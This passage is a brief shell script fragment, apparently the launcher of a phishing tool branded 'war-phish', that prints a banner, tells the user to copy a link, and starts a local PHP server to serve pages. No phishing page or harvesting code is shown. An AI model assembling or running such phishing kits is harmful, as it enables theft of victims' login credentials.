clear
cd Md
cd Coc
toilet -f standard "war-phish" | lolcat
printf "\033[32m created by riskiyans \n"
printf "   \033[0;1m [ salin link ] "
printf " \n"
echo
php -S 127.0.0.1:8080
fi
